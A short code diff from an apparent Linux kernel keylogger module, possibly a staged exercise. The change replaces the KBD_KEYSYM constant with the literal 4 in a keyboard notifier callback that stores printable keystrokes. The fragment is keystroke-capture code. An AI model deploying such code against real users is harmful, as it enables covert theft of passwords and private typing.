@@ -93,7 +93,7 @@ static int keylog_cb(struct notifier_block *nb, unsigned long action, void *data
     /* Part 2 TODO: store printable characters at KBD_KEYSYM stage */
 
     pr_info("keylog: callback fired action=%lu\n", action);
-    if (action == KBD_KEYSYM && param -> down) {
+    if (action == 4 && param -> down) {
         unsigned char c = param->value & 0xFF;
         if (c >= ' ' && c < 127) {
             spin_lock_irqsave(&keylog_lock, flags);
